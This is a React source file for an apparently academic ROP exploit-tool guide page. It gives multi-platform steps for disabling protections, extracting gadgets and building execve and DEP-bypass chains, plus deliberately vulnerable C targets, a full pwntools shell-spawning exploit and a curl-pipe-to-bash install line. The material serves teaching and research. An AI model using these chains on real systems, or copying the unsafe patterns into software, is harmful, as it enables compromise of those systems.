import React, { useState } from 'react';
import { 
  BookOpen, Terminal, Copy, Check, ShieldCheck, ChevronRight, 
  Monitor, Laptop, Apple, Cpu, Code2, AlertTriangle, ExternalLink, 
  Layers, Database, FileCode, Sparkles, CheckCircle2 
} from 'lucide-react';

export default function HowtoPage({ onNavigateTab }) {
  // Read saved OS cookie or detect from user agent
  const getInitialOS = () => {
    try {
      const match = document.cookie.match(/(?:^|; )ropweaver_preferred_os=([^;]*)/);
      if (match && match[1]) return match[1];
    } catch (e) {}

    const ua = navigator.userAgent || '';
    if (/win/i.test(ua)) return 'windows';
    if (/mac/i.test(ua)) return 'macos';
    return 'linux';
  };

  const [selectedOS, setSelectedOS] = useState(getInitialOS);
  const [copiedSection, setCopiedSection] = useState(null);
  const [activeCodeTab, setActiveCodeTab] = useState('classic');

  const handleOSChange = (newOS) => {
    setSelectedOS(newOS);
    try {
      document.cookie = `ropweaver_preferred_os=${newOS}; path=/; max-age=31536000; SameSite=Lax`;
    } catch (e) {}
  };

  const handleCopyCode = (code, id) => {
    navigator.clipboard.writeText(code);
    setCopiedSection(id);
    setTimeout(() => setCopiedSection(null), 2000);
  };

  // Comprehensive OS & Architecture Specific Research Data
  const osData = {
    linux: {
      name: 'Linux (x86_64 & i386 ELF)',
      badge: 'Linux / POSIX ELF',
      icon: Terminal,
      kernelSyscall: 'Syscall 59 (0x3b: sys_execve) / int 0x80 (x86_32)',
      binaryFormat: 'ELF (Executable and Linkable Format: 64-bit & 32-bit)',
      toolchain: 'GCC, Clang, GDB + GEF / Pwndbg, Python 3 + Pwntools, Capstone',
      steps: [
        {
          id: 'linux-env',
          title: '1. Linux Prerequisites & Toolchain Setup',
          cmd: 'sudo apt-get update && sudo apt-get install -y build-essential gcc gdb python3 python3-pip libcapstone-dev && pip3 install pwntools',
          desc: 'Install standard GNU compiler collection (GCC), GDB debugger, Capstone disassembly libraries, and Python Pwntools for automated payload construction.',
          points: [
            'Tested and validated on Ubuntu 20.04/22.04/24.04, Kali Linux 2023+, Debian 12, Arch Linux, and Fedora.',
            'For dynamic analysis with GDB, installing GEF (GDB Enhanced Features) or Pwndbg provides immediate register/stack inspection: bash -c "$(curl -fsSL https://gef.blah.cat/sh)"'
          ]
        },
        {
          id: 'linux-compile',
          title: '2. Compiling Vulnerable Test Binary (ELF)',
          cmd: 'gcc -fno-stack-protector -no-pie -z execstack -O0 -g vulnerable.c -o vulnerable_linux',
          desc: 'Compile your vulnerable C test binary disabling Stack Canaries (-fno-stack-protector), Position Independent Executables (-no-pie), and enabling executable stack (-z execstack for simple tests) or non-executable stack (-z noexecstack for pure ROP).',
          points: [
            '-fno-stack-protector: Strips GCC stack canary cookies, enabling uninterrupted saved return address overwrite.',
            '-no-pie: Fixes the virtual memory base address at 0x00400000, ensuring ROP gadget addresses remain deterministic across process invocations.',
            '-z noexecstack: Enforces Non-Executable (NX) stack protection (the primary real-world condition necessitating Return-Oriented Programming).',
            '-Wl,-z,norelro: Optional flag to disable RELRO (permits Global Offset Table overwrites).'
          ]
        },
        {
          id: 'linux-gadgets',
          title: '3. Extracting & Classifying Gadgets via ROPWeaver',
          cmd: './ropweaver vulnerable_linux --list-gadgets --suggest-gadgets --depth 5',
          desc: 'Disassemble ELF executable sections (.text, .plt, .fini) and extract useful gadget primitives ending in ret, syscall, or jmp.',
          points: [
            'Filter register staging gadgets: ./ropweaver vulnerable_linux --search "pop rdi ; ret"',
            'Search memory store gadgets: ./ropweaver vulnerable_linux --search "mov [rdi], rsi ; ret"',
            'Semantic categorization: Groups gadgets automatically into > syscall, > pop, > call, > jmp, and > load mem.',
            'Export JSON telemetry: ./ropweaver vulnerable_linux --output report_linux.json --upload-report'
          ]
        },
        {
          id: 'linux-chain',
          title: '4. Automated execve("/bin/sh") ROP Chain Synthesis',
          cmd: './ropweaver vulnerable_linux --auto-chain --target-syscall execve --binsh-addr 0x402008 --upload-report',
          desc: 'Synthesize a functional x86_64 ROP chain targeting the Linux sys_execve system call (Syscall 59 / 0x3b). ROPWeaver automatically arranges register staging gadgets and calculates stack alignment.',
          points: [
            'RDI ← Pointer to "/bin/sh" string (located in .rodata, .data, or stageable buffer)',
            'RSI ← 0x0 (NULL pointer for argv argument array)',
            'RDX ← 0x0 (NULL pointer for envp environment array)',
            'RAX ← 0x3b (59 decimal: System call identifier for sys_execve)',
            'syscall ← Triggers Linux kernel context transition to launch shell',
            '16-Byte Stack Alignment: Automatically inserts dummy "ret" gadget if required to satisfy SSE MOVAPS stack alignment.'
          ]
        },
        {
          id: 'linux-exploit',
          title: '5. Runtime Validation via GDB & Pwntools Script',
          cmd: 'python3 -c "from pwn import *; p=process(\'./vulnerable_linux\'); p.sendline(open(\'payload.bin\',\'rb\').read()); p.interactive()"',
          desc: 'Deliver the synthesized raw exploit payload into the target buffer. The Pwntools script transmits the padding offset and chains into an interactive shell.',
          points: [
            'Verify offset with GDB: gdb -q ./vulnerable_linux, run "pattern create 120", run, inspect crash with "pattern search $rsp"',
            'Piped delivery: (cat payload.bin; cat) | ./vulnerable_linux'
          ]
        }
      ]
    },
    windows: {
      name: 'Windows (PE / Win32 & Win64)',
      badge: 'Windows 10 / 11 / Server PE',
      icon: Laptop,
      kernelSyscall: 'Win32 API: VirtualProtect (DEP Bypass) & WinExec',
      binaryFormat: 'PE (Portable Executable: .exe / .dll)',
      toolchain: 'MSVC (cl.exe), MinGW-w64 (gcc), PowerShell 7, x64dbg, WinDbg',
      steps: [
        {
          id: 'win-env',
          title: '1. Windows Prerequisites & Toolchain Setup',
          cmd: 'winget install LLVM.LLVM MSYS2.MSYS2 x64dbg.x64dbg Microsoft.VisualStudio.2022.BuildTools',
          desc: 'Configure MinGW-w64 GCC or Microsoft Visual C++ (MSVC) compiler alongside x64dbg or WinDbg for dynamic execution tracking.',
          points: [
            'Supported on Windows 10, Windows 11, and Windows Server (x64 and x86 architectures).',
            'Ensure ropweaver.exe and accompanying DLLs (libcapstone.dll, libcurl-4.dll) reside in PATH or working directory.'
          ]
        },
        {
          id: 'win-compile',
          title: '2. Compiling Vulnerable Test Binary (PE / .exe)',
          cmd: 'gcc -fno-stack-protector -Wl,--disable-dynamicbase -Wl,--disable-nxcompat -O0 vulnerable.c -o vulnerable.exe',
          desc: 'Compile using MinGW GCC disabling stack canaries and ASLR / DEP flags via linker switches, or using MSVC command line.',
          points: [
            'MinGW GCC flags: -fno-stack-protector (no canaries), -Wl,--disable-dynamicbase (no ASLR), -Wl,--disable-nxcompat (no DEP)',
            'MSVC Command line: cl /GS- /sdl- /O2 /link /DYNAMICBASE:NO /NXCOMPAT:NO vulnerable.c /out:vulnerable.exe',
            '/GS-: Disables security buffer check (Stack Cookie /GS mechanism).',
            '/DYNAMICBASE:NO: Locks image base at 0x00400000 or 0x000140000000 without ASLR relocation.'
          ]
        },
        {
          id: 'win-gadgets',
          title: '3. Extracting PE Gadgets via ROPWeaver',
          cmd: '.\\ropweaver.exe vulnerable.exe --list-gadgets --format PE --depth 5',
          desc: 'Parse PE headers (IMAGE_DOS_HEADER, IMAGE_NT_HEADERS, .text, .rdata sections) and disassemble all gadgets.',
          points: [
            'Search Win64 calling convention registers: .\\ropweaver.exe vulnerable.exe --search "pop rcx ; ret"',
            'Search stack pivot primitives: .\\ropweaver.exe vulnerable.exe --search "xchg esp, eax ; ret"',
            'Upload report to cloud datastore: .\\ropweaver.exe vulnerable.exe --upload-report'
          ]
        },
        {
          id: 'win-chain',
          title: '4. Win64 VirtualProtect DEP Bypass Chain',
          cmd: '.\\ropweaver.exe vulnerable.exe --auto-chain --target-func VirtualProtect --upload-report',
          desc: 'On Windows, ROP chains typically target kernel32!VirtualProtect to mark the stack buffer as PAGE_EXECUTE_READWRITE (0x40), followed by jumping directly to shellcode.',
          points: [
            'RCX ← lpAddress (Pointer to stack shellcode buffer)',
            'RDX ← dwSize (e.g. 0x1000 bytes)',
            'R8  ← flNewProtect (0x40 = PAGE_EXECUTE_READWRITE)',
            'R9  ← lpflOldProtect (Writable scratch memory pointer)',
            'Shadow Space: Win64 ABI mandates 32 bytes (4 quadwords) of shadow stack space before function invocation.'
          ]
        },
        {
          id: 'win-exploit',
          title: '5. Payload Delivery via PowerShell & Python',
          cmd: 'python -c "import sys; sys.stdout.buffer.write(open(\'payload.bin\',\'rb\').read())" | .\\vulnerable.exe',
          desc: 'Stream raw binary byte arrays into the vulnerable executable buffer via PowerShell or Python exploit wrapper.',
          points: [
            'PowerShell one-liner: $bytes = [IO.File]::ReadAllBytes("payload.bin"); cmd /c "vulnerable.exe < payload.bin"',
            'x64dbg verification: Set breakpoint at return address (ret) to verify RCX, RDX, R8 register staging.'
          ]
        }
      ]
    },
    macos: {
      name: 'macOS (Mach-O / Apple Silicon & Intel)',
      badge: 'macOS Sonoma / Ventura / Monterey',
      icon: Apple,
      kernelSyscall: 'XNU BSD Syscall 59 / posix_spawn',
      binaryFormat: 'Mach-O (Mach Object 64-bit: ARM64 & x86_64)',
      toolchain: 'Xcode Command Line Tools (Apple Clang), LLDB, Homebrew',
      steps: [
        {
          id: 'mac-env',
          title: '1. macOS Prerequisites & Toolchain Setup',
          cmd: 'xcode-select --install && brew install capstone python',
          desc: 'Install Apple Clang compiler, LLDB debugger, and Capstone Engine disassembler via Homebrew.',
          points: [
            'Supports Apple Silicon (M1/M2/M3/M4 ARM64) and Intel (x86_64) binaries.',
            'Ad-hoc code signing is mandatory on Darwin to execute unsigned local test binaries.'
          ]
        },
        {
          id: 'mac-compile',
          title: '2. Compiling Vulnerable Test Binary (Mach-O)',
          cmd: 'clang -fno-stack-protector -fno-pie -O0 vulnerable.c -o vulnerable_mac && codesign -s - --force ./vulnerable_mac',
          desc: 'Compile Mach-O binary disabling compiler stack protectors, then apply an ad-hoc local code signature.',
          points: [
            '-fno-stack-protector: Strips Stack Smashing Protection (__stack_chk_guard / __stack_chk_fail).',
            '-fno-pie: Disables Position Independent Executable generation.',
            'codesign -s - --force: Applies mandatory local Apple code signature to permit kernel execution.'
          ]
        },
        {
          id: 'mac-gadgets',
          title: '3. Extracting Mach-O Gadgets via ROPWeaver',
          cmd: './ropweaver vulnerable_mac --list-gadgets --format MACHO',
          desc: 'Analyze Mach-O LC_SEGMENT_64 (__TEXT,__text) load commands and extract return-oriented primitives.',
          points: [
            'Search Darwin gadgets: ./ropweaver vulnerable_mac --search "pop rdi ; ret"',
            'Search ARM64 branch gadgets: ./ropweaver vulnerable_mac --search "blr x8"',
            'Upload report: ./ropweaver vulnerable_mac --upload-report'
          ]
        },
        {
          id: 'mac-chain',
          title: '4. BSD Syscall & posix_spawn Chain Synthesis',
          cmd: './ropweaver vulnerable_mac --auto-chain --upload-report',
          desc: 'Synthesizes register staging for Darwin BSD syscalls (rax = 0x200003b for sys_execve or posix_spawn invocation).',
          points: [
            'RDI / X0 ← Pointer to "/bin/sh" string',
            'RSI / X1 ← Arguments pointer array',
            'RDX / X2 ← Environment pointer array',
            'RAX / X16 ← Darwin syscall class 2 BSD mask (0x200003b)',
            'syscall / svc #0x80 ← Triggers XNU kernel trap'
          ]
        },
        {
          id: 'mac-exploit',
          title: '5. Payload Delivery & LLDB Debugging',
          cmd: 'cat payload.bin | ./vulnerable_mac',
          desc: 'Pipe the exploit payload into the target process or inspect register states within LLDB.',
          points: [
            'Attach debugger: lldb ./vulnerable_mac',
            'Inspect crash: register read, disassemble --frame'
          ]
        }
      ]
    },
    arm: {
      name: 'ARM & AArch64 (ARMv7 32-bit & AArch64 64-bit)',
      badge: 'Embedded Linux & Android ARM',
      icon: Cpu,
      kernelSyscall: 'ARMv7: svc 0 (Syscall 11) / AArch64: svc 0 (Syscall 221)',
      binaryFormat: 'ELF (ARM 32-bit EABI & AArch64 64-bit)',
      toolchain: 'gcc-arm-linux-gnueabihf, gcc-aarch64-linux-gnu, QEMU User, GDB-multiarch',
      steps: [
        {
          id: 'arm-env',
          title: '1. ARM Cross-Compilation & QEMU Emulator Setup',
          cmd: 'sudo apt-get install -y gcc-arm-linux-gnueabihf gcc-aarch64-linux-gnu qemu-user qemu-user-static gdb-multiarch',
          desc: 'Install GNU cross-compilers for ARMv7 and AArch64 alongside QEMU user-mode emulator for emulated execution.',
          points: [
            'Allows compilation and execution of ARM/AArch64 binaries directly on x86_64 host machines.',
            'QEMU user-mode executes ARM binaries transparently: qemu-arm-static ./vulnerable_arm'
          ]
        },
        {
          id: 'arm-compile',
          title: '2. Compiling Vulnerable ARM Test Binaries',
          cmd: 'arm-linux-gnueabihf-gcc -fno-stack-protector -no-pie -z execstack -O0 vulnerable.c -o vulnerable_arm32 && aarch64-linux-gnu-gcc -fno-stack-protector -no-pie -O0 vulnerable.c -o vulnerable_arm64',
          desc: 'Cross-compile both 32-bit ARM (ARMv7) and 64-bit ARM (AArch64) test executables with stack protections disabled.',
          points: [
            'ARMv7 (32-bit): Uses Link Register (LR / R14) for returns; ROP gadgets typically chain via "pop {r0, pc}" or "bx lr".',
            'AArch64 (64-bit): Uses X30 (Link Register) and RET instructions; gadgets chain via "ldp x29, x30, [sp], #32 ; ret".'
          ]
        },
        {
          id: 'arm-gadgets',
          title: '3. Extracting ARM Gadgets via ROPWeaver',
          cmd: './ropweaver vulnerable_arm64 --arch aarch64 --list-gadgets --suggest-gadgets',
          desc: 'Disassemble ARM instructions in ARM and Thumb modes or AArch64 fixed 32-bit instructions via Capstone.',
          points: [
            'Search AArch64 register loaders: ./ropweaver vulnerable_arm64 --search "ldr x0, [sp]"',
            'Search ARMv7 pop PC gadgets: ./ropweaver vulnerable_arm32 --search "pop {r0, pc}"',
            'Upload report to cloud datastore: ./ropweaver vulnerable_arm64 --upload-report'
          ]
        },
        {
          id: 'arm-chain',
          title: '4. ARM / AArch64 Linux Syscall Chain Synthesis',
          cmd: './ropweaver vulnerable_arm64 --auto-chain --target-syscall execve',
          desc: 'Synthesize register staging for ARM kernel system calls.',
          points: [
            'ARMv7: R7 = 11 (sys_execve), R0 = "/bin/sh", R1 = 0, R2 = 0, executed via "svc 0".',
            'AArch64: X8 = 221 (sys_execve), X0 = "/bin/sh", X1 = 0, X2 = 0, executed via "svc #0".'
          ]
        },
        {
          id: 'arm-exploit',
          title: '5. Running & Debugging under QEMU + GDB-Multiarch',
          cmd: 'qemu-aarch64 -g 1234 ./vulnerable_arm64 & gdb-multiarch -q -ex "target remote localhost:1234" ./vulnerable_arm64',
          desc: 'Launch the vulnerable ARM binary under QEMU with GDB stub enabled on port 1234 for interactive step debugging.',
          points: [
            'Allows setting breakpoints on return instructions: b *0x40058c',
            'Inspect ARM registers: info registers x0 x1 x2 x8 pc'
          ]
        }
      ]
    },
    riscv: {
      name: 'RISC-V (RV64GC / QEMU Emulator)',
      badge: 'Next-Gen Open ISA RISC-V',
      icon: Cpu,
      kernelSyscall: 'ECALL (Syscall 221: sys_execve on Linux RV64)',
      binaryFormat: 'ELF (RISC-V 64-bit LP64D)',
      toolchain: 'gcc-riscv64-linux-gnu, qemu-user-static, gdb-multiarch',
      steps: [
        {
          id: 'riscv-env',
          title: '1. RISC-V Toolchain & QEMU Setup',
          cmd: 'sudo apt-get install -y gcc-riscv64-linux-gnu qemu-user qemu-user-static gdb-multiarch',
          desc: 'Install the GNU cross-compiler for 64-bit RISC-V (RV64GC) and QEMU user emulator as highlighted in the Oxford Brookes dissertation.',
          points: [
            'Tested on Ubuntu/Debian host machines for automated RISC-V security research.',
            'Directly supports QEMU emulation: qemu-riscv64-static ./vulnerable_riscv'
          ]
        },
        {
          id: 'riscv-compile',
          title: '2. Compiling Vulnerable RISC-V Binary',
          cmd: 'riscv64-linux-gnu-gcc -fno-stack-protector -no-pie -O0 vulnerable.c -o vulnerable_riscv',
          desc: 'Cross-compile vulnerable C source for 64-bit RISC-V with stack canaries disabled.',
          points: [
            'RISC-V Return Register: Return address is stored in ra (x1) and return is executed via "ret" (pseudo-instruction for "jalr zero, 0(ra)").',
            'Registers a0-a7 (x10-x17) serve as argument and system call registers.'
          ]
        },
        {
          id: 'riscv-gadgets',
          title: '3. Extracting RISC-V Gadgets via ROPWeaver',
          cmd: './ropweaver vulnerable_riscv --arch riscv --list-gadgets --suggest-gadgets',
          desc: 'Disassemble RISC-V standard integer (I) and compressed (C) instruction extensions using Capstone.',
          points: [
            'Search load register gadgets: ./ropweaver vulnerable_riscv --search "ld a0, 0(sp) ; ret"',
            'Search system call traps: ./ropweaver vulnerable_riscv --search "ecall"',
            'Upload report: ./ropweaver vulnerable_riscv --upload-report'
          ]
        },
        {
          id: 'riscv-chain',
          title: '4. RISC-V ecall Syscall Chain Synthesis',
          cmd: './ropweaver vulnerable_riscv --auto-chain --target-syscall execve',
          desc: 'Synthesize register staging targeting the RISC-V sys_execve system call.',
          points: [
            'a7 (x17) ← 221 (Linux RV64 sys_execve system call number)',
            'a0 (x10) ← Pointer to "/bin/sh" string',
            'a1 (x11) ← 0 (argv NULL pointer)',
            'a2 (x12) ← 0 (envp NULL pointer)',
            'ecall ← Triggers RISC-V environment call context switch'
          ]
        },
        {
          id: 'riscv-exploit',
          title: '5. Executing & Debugging under QEMU RISC-V',
          cmd: 'qemu-riscv64 -g 1234 ./vulnerable_riscv & gdb-multiarch -q -ex "target remote localhost:1234" ./vulnerable_riscv',
          desc: 'Deliver payload and debug control flow redirection in emulated RISC-V hardware.',
          points: [
            'Verify stack pointer alignment: RISC-V requires 16-byte stack alignment at function calls.',
            'Inspect RISC-V registers: info registers ra sp a0 a1 a7'
          ]
        }
      ]
    },
    raw: {
      name: 'RAW Firmware & Microcontroller Blobs',
      badge: 'Bare-Metal & IoT Firmware',
      icon: Layers,
      kernelSyscall: 'Direct Software Interrupt / SVC / Branch to Function',
      binaryFormat: 'RAW Flat Binary (No headers / Hex dump)',
      toolchain: 'ROPWeaver CLI, Capstone Engine, Ghidra, Binwalk',
      steps: [
        {
          id: 'raw-env',
          title: '1. RAW Firmware Ingestion Setup',
          cmd: './ropweaver firmware.bin --raw --arch arm --base-addr 0x08000000',
          desc: 'Analyze raw flash memory dumps, bootloader images, or bare-metal microcontroller firmware without ELF/PE headers.',
          points: [
            'Must specify custom architecture: --arch (arm, x86_64, i386, riscv).',
            'Must specify flash base address: --base-addr (e.g. 0x08000000 for STM32 ARM Cortex-M flash).'
          ]
        },
        {
          id: 'raw-extract',
          title: '2. Gadget Discovery in Raw Memory',
          cmd: './ropweaver firmware.bin --raw --arch arm --depth 4 --suggest-gadgets',
          desc: 'Disassembles raw binary bytes linearly and iteratively looking for valid return sequences.',
          points: [
            'Automatically skips non-executable data sections (0xFF or zero padding).',
            'Identifies branch-and-link (BL/BLX) and return instructions (POP {PC}, BX LR).'
          ]
        },
        {
          id: 'raw-upload',
          title: '3. Cloud Datastore Archival',
          cmd: './ropweaver firmware.bin --raw --arch arm --upload-report',
          desc: 'Publishes discovered raw gadget catalog to Firebase Firestore for remote team analysis and web explorer queries.',
          points: [
            'Allows team members to query firmware gadgets via web explorer without downloading huge firmware dumps.',
            'Generates full offline JSON report for Ghidra / IDA Pro script import.'
          ]
        }
      ]
    }
  };

  const currentOS = osData[selectedOS] || osData.linux;
  const OSIcon = currentOS.icon;

  // Complete C Source Code Targets from Research
  const codeExamples = {
    classic: {
      title: 'vulnerable.c (Classic Buffer Overflow Target)',
      desc: 'Standard stack-based buffer overflow with unbound gets() or strcpy(). Ideal for learning ROP register staging without canaries.',
      compilerCmd: 'gcc -fno-stack-protector -no-pie -z noexecstack -O0 vulnerable.c -o vulnerable',
      code: `#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// Useful embedded gadget anchor or target string
char binsh_str[] = "/bin/sh";

void vulnerable_function() {
    char buffer[64];
    printf("[+] Enter input: ");
    // Vulnerable unbound input: reads past 64-byte stack frame
    gets(buffer); 
    printf("[+] Input received: %s\\n", buffer);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("=== ROPWeaver Classical Target Binary ===\\n");
    printf("[i] Target string /bin/sh at: %p\\n", binsh_str);
    vulnerable_function();
    printf("[-] Function returned normally.\\n");
    return 0;
}`
    },
    pivot: {
      title: 'stack_pivot.c (Restricted Buffer Target)',
      desc: 'Small stack frame (32 bytes) that cannot fit a multi-stage ROP chain directly. Forces an initial stack pivot gadget (xchg esp, eax or leave; ret) into heap/bss.',
      compilerCmd: 'gcc -fno-stack-protector -no-pie -z noexecstack -O0 stack_pivot.c -o stack_pivot',
      code: `#include <stdio.h>
#include <unistd.h>

char global_scratchpad[512];

void vulnerable_pivot() {
    char small_buffer[32];
    printf("[+] Stage 1: Send large ROP payload to global buffer (at %p): ", global_scratchpad);
    read(0, global_scratchpad, 512);

    printf("[+] Stage 2: Send pivot payload to small stack buffer: ");
    // Overwrites saved RBP and saved RIP with stack pivot
    read(0, small_buffer, 48); 
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("=== ROPWeaver Stack Pivoting Target Binary ===\n");
    vulnerable_pivot();
    return 0;
}`
    },
    ret2win: {
      title: 'ret2win.c (Return-to-Win with Argument Staging)',
      desc: 'Introductory ROP challenge binary requiring register staging (RDI, RSI) to pass conditional parameter checks to win() without spawning shellcode.',
      compilerCmd: 'gcc -fno-stack-protector -no-pie -z noexecstack -O0 ret2win.c -o ret2win',
      code: `#include <stdio.h>
#include <stdlib.h>

void win(int magic1, int magic2) {
    if (magic1 == 0xdeadbeef && magic2 == 0xcafebabe) {
        printf("[+] SUCCESS! Authenticated session granted.\\n");
        system("/bin/sh");
    } else {
        printf("[-] Access Denied: Incorrect tokens passed to win().\\n");
    }
}

void vuln() {
    char buffer[40];
    printf("[+] Enter your payload: ");
    gets(buffer); // Vulnerable unbound input
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("=== ROPWeaver ret2win Parameter Verification Target ===\\n");
    printf("[i] Target win() address: %p\\n", win);
    vuln();
    return 0;
}`
    },
    pwntools: {
      title: 'exploit.py (Complete Automated Pwntools Exploit)',
      desc: 'Production-ready Python Pwntools exploit script parsing ROPWeaver generated gadget addresses and delivering the automated payload.',
      compilerCmd: 'python3 exploit.py',
      code: `#!/usr/bin/env python3
"""
ROPWeaver Automated Exploitation Script
Synthesized via ROPWeaver Cloud Engine
"""
from pwn import *

# Context configuration
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

binary_path = './vulnerable'
p = process(binary_path)

# Calculated offset to Saved RIP (64 bytes buffer + 8 bytes saved RBP)
OFFSET = 72

# Gadget Addresses Discovered by ROPWeaver
POP_RDI = 0x0040115b    # pop rdi ; ret
POP_RSI_RDX = 0x0040115d# pop rsi ; pop rdx ; ret
POP_RAX = 0x00401159    # pop rax ; ret
SYSCALL = 0x00401160    # syscall
BINSH_ADDR = 0x00404028 # Address of "/bin/sh" string

log.info("Constructing ROP chain for sys_execve('/bin/sh', 0, 0)...")
rop = b""
# 1. Stage RDI with pointer to "/bin/sh"
rop += p64(POP_RDI)
rop += p64(BINSH_ADDR)

# 2. Stage RSI = 0, RDX = 0 (NULL pointers for argv and envp)
rop += p64(POP_RSI_RDX)
rop += p64(0x0)
rop += p64(0x0)

# 3. Stage RAX = 59 (0x3b: Linux sys_execve syscall number)
rop += p64(POP_RAX)
rop += p64(0x3b)

# 4. Trigger kernel trap
rop += p64(SYSCALL)

# Assemble final payload
payload = b"A" * OFFSET + rop

log.info(f"Sending payload ({len(payload)} bytes)...")
p.sendlineafter(b"Enter input: ", payload)

# Hand over to interactive shell
log.success("ROP chain executed! Spawning interactive shell:")
p.interactive()`
    }
  };

  return (
    <div className="howto-page fade-in">
      {/* Hero Header */}
      <div className="explorer-hero">
        <span className="hero-terminal-tag mono">&gt; ropweaver developer_and_researcher_guide</span>
        <h1 className="hero-title">Developer &amp; Researcher Guide</h1>
        <p className="hero-subtitle">
          Comprehensive handbook for Return-Oriented Programming (ROP) exploit development, multi-architecture compiler flags, vulnerable test binaries, GDB runtime simulation, and Pwntools payload integration across Linux, Windows, macOS, ARM, and RISC-V.
        </p>
      </div>

      {/* Academic Dissertation Research Reference Box */}
      <div className="research-citation-card mono text-xs">
        <div className="citation-header">
          <BookOpen size={16} className="text-accent-green" />
          <span className="citation-title font-bold text-accent-green">
            OXFORD BROOKES UNIVERSITY &bull; MASTER OF SCIENCE DISSERTATION RESEARCH
          </span>
        </div>
        <p className="citation-text text-muted" style={{ margin: '0.5rem 0', lineHeight: '1.6' }}>
          <strong>Dissertation Title:</strong> <em>"Constructing a tool for building Return Oriented Programming exploits"</em> (Course: COMP7039)<br />
          <strong>Author:</strong> Chrisbin Thomas (Student ID: 19274867) &bull; <strong>Supervisor:</strong> Ian Bayley &bull; <strong>Date:</strong> 31/05/2025
        </p>
        <div className="citation-badges">
          <span className="badge badge-info">Multi-Architecture (x86/x64, ARM, RISC-V)</span>
          <span className="badge badge-warning">Native Capstone Disassembly</span>
          <span className="badge badge-on">Firebase Cloud Datastore</span>
          <span className="badge badge-info">Automated Execve Synthesis</span>
        </div>
      </div>

      {/* OS & Architecture Selection Controls */}
      <div className="os-selector-card" style={{ marginTop: '2rem' }}>
        <div className="os-selector-header">
          <div className="os-selector-label mono">
            <Monitor size={16} className="text-accent-green" />
            <span>SELECT HOST OPERATING SYSTEM &amp; TARGET ARCHITECTURE:</span>
          </div>
          <div className="os-dropdown-wrap">
            <select
              value={selectedOS}
              onChange={(e) => handleOSChange(e.target.value)}
              className="os-select-dropdown mono"
            >
              <option value="linux">🐧 Linux (Ubuntu, Debian, Kali, Arch - x86_64 / i386 ELF)</option>
              <option value="windows">🪟 Windows (10, 11, Server - PE / Win32 & Win64)</option>
              <option value="macos">🍎 macOS (Apple Silicon & Intel - Mach-O)</option>
              <option value="arm">📱 ARM & AArch64 (ARMv7 32-bit & ARM64 ELF)</option>
              <option value="riscv">⚡ RISC-V (RV64GC / QEMU Emulator)</option>
              <option value="raw">💾 RAW Binary / Firmware Blobs (Microcontrollers)</option>
            </select>
          </div>
        </div>

        {/* OS Quick Switcher Buttons */}
        <div className="os-buttons-row">
          <button
            onClick={() => handleOSChange('linux')}
            className={`os-tab-btn ${selectedOS === 'linux' ? 'active' : ''}`}
          >
            <Terminal size={15} />
            <span>Linux (ELF)</span>
          </button>
          <button
            onClick={() => handleOSChange('windows')}
            className={`os-tab-btn ${selectedOS === 'windows' ? 'active' : ''}`}
          >
            <Laptop size={15} />
            <span>Windows (PE)</span>
          </button>
          <button
            onClick={() => handleOSChange('macos')}
            className={`os-tab-btn ${selectedOS === 'macos' ? 'active' : ''}`}
          >
            <Apple size={15} />
            <span>macOS (Mach-O)</span>
          </button>
          <button
            onClick={() => handleOSChange('arm')}
            className={`os-tab-btn ${selectedOS === 'arm' ? 'active' : ''}`}
          >
            <Cpu size={15} />
            <span>ARM &amp; AArch64</span>
          </button>
          <button
            onClick={() => handleOSChange('riscv')}
            className={`os-tab-btn ${selectedOS === 'riscv' ? 'active' : ''}`}
          >
            <Cpu size={15} />
            <span>RISC-V</span>
          </button>
          <button
            onClick={() => handleOSChange('raw')}
            className={`os-tab-btn ${selectedOS === 'raw' ? 'active' : ''}`}
          >
            <Layers size={15} />
            <span>RAW Firmware</span>
          </button>
        </div>

        {/* Active OS Overview Banner */}
        <div className="active-os-banner">
          <div className="os-banner-left">
            <OSIcon size={24} className="text-accent-cyan" />
            <div>
              <h3 className="os-banner-title mono">{currentOS.name}</h3>
              <p className="os-banner-sub text-xs text-muted">
                Format: <strong className="text-accent-green">{currentOS.binaryFormat}</strong> &bull; Target: <span className="text-accent-orange">{currentOS.kernelSyscall}</span>
              </p>
            </div>
          </div>
          <div className="os-banner-badge mono text-xs">
            {currentOS.badge}
          </div>
        </div>
      </div>

      {/* Step-by-Step Walkthrough for Selected OS */}
      <div className="howto-sections-grid" style={{ marginTop: '2rem' }}>
        {currentOS.steps.map((sec) => (
          <div key={sec.id} className="howto-card">
            <div className="howto-card-header">
              <span className="mono font-bold text-accent-cyan text-sm">{sec.title}</span>
              <button
                onClick={() => handleCopyCode(sec.cmd, sec.id)}
                className="btn btn-secondary btn-xs mono"
                title="Copy Command"
              >
                {copiedSection === sec.id ? <Check size={12} className="text-accent-green" /> : <Copy size={12} />}
                <span>{copiedSection === sec.id ? 'COPIED' : 'COPY'}</span>
              </button>
            </div>

            <div className="howto-cmd-box mono text-xs text-accent-green">
              <span>$ {sec.cmd}</span>
            </div>

            <p className="howto-desc text-muted text-sm">{sec.desc}</p>

            <div className="howto-points-box mono text-xs">
              <span className="text-dim">&gt; Key Details &amp; Operational Flags:</span>
              <ul>
                {sec.points.map((pt, idx) => (
                  <li key={idx} className="howto-point-item">
                    <span className="text-accent-orange">&bull;</span>
                    <span>{pt}</span>
                  </li>
                ))}
              </ul>
            </div>
          </div>
        ))}
      </div>

      {/* Interactive Vulnerable C Code Playground */}
      <div className="howto-card" style={{ marginTop: '2.5rem' }}>
        <div className="howto-card-header">
          <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
            <FileCode size={18} className="text-accent-green" />
            <span className="mono font-bold text-accent-green text-sm">
              VULNERABLE TEST BINARIES &amp; EXPLOIT PLAYGROUND (C &amp; PYTHON)
            </span>
          </div>
          <button
            onClick={() => handleCopyCode(codeExamples[activeCodeTab].code, `code-${activeCodeTab}`)}
            className="btn btn-secondary btn-xs mono"
          >
            {copiedSection === `code-${activeCodeTab}` ? <Check size={12} className="text-accent-green" /> : <Copy size={12} />}
            <span>{copiedSection === `code-${activeCodeTab}` ? 'COPIED SOURCE' : 'COPY CODE'}</span>
          </button>
        </div>

        {/* Code Selector Tabs */}
        <div className="code-tabs-row" style={{ display: 'flex', gap: '0.5rem', marginBottom: '1rem', flexWrap: 'wrap' }}>
          <button
            onClick={() => setActiveCodeTab('classic')}
